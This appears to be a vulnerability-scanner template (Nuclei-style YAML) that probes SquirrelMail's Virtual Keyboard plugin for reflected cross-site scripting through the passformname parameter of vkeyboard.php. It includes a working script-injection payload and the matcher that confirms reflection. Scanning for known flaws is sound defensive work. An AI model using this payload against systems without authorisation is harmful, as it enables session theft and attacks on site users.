http:
- matchers:
  - status:
    - 200
    type: status
  - part: body
    type: word
    words:
    - onclick="window.opener.document.forms[0].{{payload}}
  - part: header
    type: word
    words:
    - text/html
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/plugins/vkeyboard/vkeyboard.php?passformname={{url_encode(payload)}}'
id: squirrelmail-vkeyboard-xss
info:
  author: dhiyaneshDk
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cwe-id: CWE-80
  description: SquirrelMail Virtual Keyboard plugin 0.9.1 and prior contains a cross-site
    scripting vulnerability via the vkeyboard.php parameter. It fails to properly
    sanitize user-supplied input, which allows an attacker to execute arbitrary script
    in the browser of an unsuspecting user in the context of the affected site. This
    can allow the attacker to steal cookie-based authentication credentials and launch
    other attacks.
  metadata:
    max-request: 1
  name: SquirrelMail Virtual Keyboard <=0.9.1 - Cross-Site Scripting
  reference:
  - https://www.exploit-db.com/exploits/34814
  severity: medium
  tags: xss,squirrelmail,plugin,edb
variables:
  payload: '"><script>alert({{rand_int()}});</script><script>/*'
